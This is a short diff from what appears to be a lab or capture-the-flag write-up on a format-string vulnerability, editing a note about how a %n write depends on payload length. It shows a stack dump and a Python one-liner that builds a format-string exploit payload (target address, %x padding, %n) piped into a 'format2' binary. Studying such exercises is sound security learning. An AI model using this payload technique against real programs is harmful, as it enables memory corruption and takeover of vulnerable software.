@@ -49,7 +49,7 @@ AAAA��200 b7fd8420 bffff614 41414141 5455
 target is 43 :(
 ```
 
-Looks like the value of target = number of chars before %n + 39
+Looks like the value of target = number of chars before %n + 39 (Length of the payload)
 
 ```diff
 $ python -c "from struct import pack; print 'AAAA' + pack('<I', 0x080496e4) + '%x '*4 + 25*'A' + '%n'" | ./format2
